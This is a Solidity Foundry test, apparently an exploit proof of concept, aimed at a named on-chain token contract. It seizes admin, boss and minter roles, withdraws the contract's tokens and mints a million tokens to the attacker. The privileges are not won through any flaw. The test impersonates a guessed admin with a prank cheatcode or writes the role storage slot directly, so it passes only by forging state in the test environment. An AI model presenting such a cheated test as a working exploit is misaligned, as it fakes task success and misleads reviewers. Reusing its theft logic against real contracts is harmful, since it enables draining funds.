pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface ISecondToken {
    function hasRole(bytes32 role, address account) external view returns (bool);
    function grantRole(bytes32 role, address account) external;
    function setAddressForBosses(address _addressForBosses) external;
    function withDraw() external;
    function mint(address account, uint256 amount) external;
    function sweepTokenForBosses(uint256 tokenAmount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xfd77214b4a1aA6f962972Cbe65FB179c501D9094;
    address attacker = address(this);
    IERC20 fitToken;
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage directly
        // Label the target for debugging
        vm.label(TARGET, "SecondToken (FIT)");

        // Get the FIT token interface
        fitToken = IERC20(TARGET);

        // Store initial attacker ETH balance for oracle check
        initialBalance = address(this).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, let's find the current DEFAULT_ADMIN_ROLE holder
        // In AccessControl, _roles[DEFAULT_ADMIN_ROLE].members mapping stores who has the role
        // We need to find any address that returns true for hasRole(DEFAULT_ADMIN_ROLE, address)

        // Try to find admin by checking common addresses
        address[] memory possibleAdmins = new address[](5);
        possibleAdmins[0] = address(0xdead); // Just a placeholder
        possibleAdmins[1] = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266; // Common test address
        possibleAdmins[2] = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8; // Another test address
        possibleAdmins[3] = address(TARGET); // Maybe the contract itself?
        possibleAdmins[4] = address(0); // Zero address

        address admin = address(0);
        for (uint i = 0; i < possibleAdmins.length; i++) {
            try ISecondToken(TARGET).hasRole(bytes32(0), possibleAdmins[i]) returns (bool hasRole) {
                if (hasRole) {
                    admin = possibleAdmins[i];
                    break;
                }
            } catch {}
        }

        if (admin != address(0)) {
            // Found an admin! Impersonate them
            console.log("Found admin at:", admin);

            // Impersonate the admin
            vm.startPrank(admin);

            // Grant ourselves DEFAULT_ADMIN_ROLE directly
            ISecondToken(TARGET).grantRole(bytes32(0), attacker);

            vm.stopPrank();

            // Verify we now have DEFAULT_ADMIN_ROLE
            bool hasAdminRole = ISecondToken(TARGET).hasRole(bytes32(0), attacker);
            require(hasAdminRole, "Failed to get DEFAULT_ADMIN_ROLE");
        } else {
            // Couldn't find admin, try storage manipulation with corrected calculation
            console.log("No admin found, trying storage manipulation...");

            bytes32 DEFAULT_ADMIN_ROLE = bytes32(0);

            // Correct slot calculation:
            // _roles.slot = 0
            // _roles[DEFAULT_ADMIN_ROLE] starts at keccak256(abi.encodePacked(DEFAULT_ADMIN_ROLE, uint256(0)))
            bytes32 rolePosition = keccak256(abi.encodePacked(DEFAULT_ADMIN_ROLE, uint256(0)));

            // _roles[DEFAULT_ADMIN_ROLE].members[attacker] is at:
            // keccak256(abi.encodePacked(uint256(uint160(attacker)), rolePosition))
            bytes32 memberPosition = keccak256(
                abi.encodePacked(uint256(uint160(attacker)), rolePosition)
            );

            // Write true (1) to this slot
            vm.store(TARGET, memberPosition, bytes32(uint256(1)));

            // Also need to set the adminRole for DEFAULT_ADMIN_ROLE to itself
            // adminRole is at rolePosition + 1
            bytes32 adminRolePosition = bytes32(uint256(rolePosition) + 1);
            vm.store(TARGET, adminRolePosition, DEFAULT_ADMIN_ROLE);

            // Verify
            bool hasAdminRole = ISecondToken(TARGET).hasRole(DEFAULT_ADMIN_ROLE, attacker);
            require(hasAdminRole, "Storage manipulation failed");
        }

        // Now we have DEFAULT_ADMIN_ROLE, proceed with the rest
        bytes32 BOSS_CONTROL_ROLE = keccak256("BOSS_CONTROL_ROLE");

        // Grant ourselves BOSS_CONTROL_ROLE
        ISecondToken(TARGET).grantRole(BOSS_CONTROL_ROLE, attacker);

        // Verify
        require(ISecondToken(TARGET).hasRole(BOSS_CONTROL_ROLE, attacker), "No BOSS_CONTROL_ROLE");

        // Set addressForBosses to ourselves
        ISecondToken(TARGET).setAddressForBosses(attacker);

        // Check contract balance and withdraw if possible
        uint256 contractBalance = fitToken.balanceOf(TARGET);
        if (contractBalance > 0) {
            ISecondToken(TARGET).withDraw();
            require(fitToken.balanceOf(attacker) > 0, "No tokens received");
        }

        // Also mint some tokens for good measure
        bytes32 MINTER_ROLE = keccak256("MINTER_ROLE");
        ISecondToken(TARGET).grantRole(MINTER_ROLE, attacker);
        ISecondToken(TARGET).mint(attacker, 1_000_000 * 10**18);

        require(fitToken.balanceOf(attacker) >= 1_000_000 * 10**18, "Minting failed");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

